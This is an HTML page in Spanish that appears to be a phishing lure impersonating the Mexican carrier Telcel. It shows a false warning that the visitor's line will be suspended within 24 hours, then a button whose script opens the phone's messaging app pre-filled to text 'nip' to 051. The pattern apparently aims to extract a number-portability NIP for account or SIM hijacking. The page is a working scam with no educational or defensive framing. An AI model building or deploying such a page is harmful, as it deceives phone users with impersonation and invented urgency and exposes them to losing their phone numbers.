<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Enviar SMS</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
      background: url("https://i.blogs.es/dac5e1/5g-telcel-1/1366_2000.jpeg") no-repeat center center/cover;
      position: relative;
    }

    body::before {
      content: "";
      position: absolute;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background: rgba(0,0,0,0.4);
      z-index: 0;
    }

    .container {
      position: relative;
      z-index: 1;
      background: rgba(255,255,255,0.95);
      padding: 25px;
      border-radius: 12px;
      box-shadow: 0 5px 20px rgba(0,0,0,0.3);
      text-align: center;
      width: 90%;
      max-width: 380px;
    }

    .alerta {
      background: #ffdddd;
      color: #a10000;
      border: 1px solid #a10000;
      padding: 10px;
      border-radius: 6px;
      font-size: 14px;
      font-weight: bold;
      margin-bottom: 20px;
    }

    h1 {
      font-size: 20px;
      margin-bottom: 10px;
    }

    p {
      font-size: 14px;
      color: #555;
      margin-bottom: 20px;
    }

    .btn {
      display: inline-block;
      padding: 12px 25px;
      background: #c00000;
      color: #fff;
      text-decoration: none;
      font-size: 16px;
      font-weight: bold;
      border-radius: 6px;
      border: none;
      transition: background 0.3s, transform 0.2s;
    }

    .btn:hover {
      background: #900000;
      transform: translateY(-2px);
      box-shadow: 0 4px 8px rgba(0,0,0,0.2);
    }

    .warning {
      color: #b33;
      font-size: 13px;
      margin-top: 8px;
      display: none;
    }

    /* Logo por fuera, arriba del contenedor */
    .logo-superpuesto {
      position: absolute;
      top: calc(50% - 280px); /* Ajusta esta cifra si es necesario */
      left: 50%;
      transform: translateX(-50%);
      width: 120px;
      z-index: 2;
      opacity: 0.95;
    }
  </style>
</head>
<body>

  <!-- Logo fuera del contenedor, arriba de él -->
  <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAT4AAACfCAMAAABX0UX9AAABEVBMVEX///8ASaj///3//v8ASKn//v4AQ6cBSqf///sAP6YASaxph8IAPKYATq8AOqbZ4PAeW6/z9vm5yuQAOqHA0Oikttk6Y7WtvuHHz+fq7/bAy+VggMBOeL45ardceb5tjcfh6PUAQaoAP6G3xOQAPaAATKVIcrsARq0ANKYAQ6AAQa8ASKEAMaMATaMAPKrX4OwVVbGMpMzy9f+vvtdbgc7M2ueOqcyLrdfDzuvh5u5xmtYAJ5YAGZmBnswAJ6Rfj8aPpdcdWalJeLVMabmYqtk0ba+1yNtvlcgwY642crhokNLY2et8jc5ogsORoshgicrI3vfV6/lDYqiGquCuu+I1Z8BRf7Rxh7nn9voAOrF/lsx3T6zdAAAV7ElEQVR4nO1cC1vbRtaekcajkSxf5BsIY2z5JgvHxpAYwnbpQkIgW5o26aYt6///Q/...
  (TRUNCADO POR EXTENSIÓN - puedes usar tu imagen base64 o una URL)
  " alt="Logo" class="logo-superpuesto" />

  <div class="container">
    <div class="alerta">
      ⚠️ Actualiza tu línea Telcel lo antes posible tienes 24 horas de lo contrario será suspendida.
    </div>

    <h1>Enviar NIP por SMS</h1>
    <p>Haz clic en el botón para abrir tu app de mensajes y enviar el NIP.</p>

    <a id="smsLink" class="btn" href="#">Enviar SMS</a>

    <div id="warning" class="warning">
      Es posible que el enlace no funcione en PC. Usa tu teléfono para enviar el SMS.
    </div>
  </div>

  <script>
    function isMobile() {
      return /Mobi|Android|iPhone|iPad|iPod|Opera Mini|IEMobile/i.test(navigator.userAgent);
    }

    function isIOS() {
      return /iPhone|iPad|iPod/i.test(navigator.userAgent);
    }

    const link = document.getElementById('smsLink');
    const numero = "051";
    const mensaje = "nip";

    if (!isMobile()) {
      document.getElementById('warning').style.display = 'block';
    } else {
      link.href = isIOS()
        ? `sms:${numero}&body=${mensaje}`
        : `sms:${numero}?body=${mensaje}`;
    }
  </script>
</body>
</html>
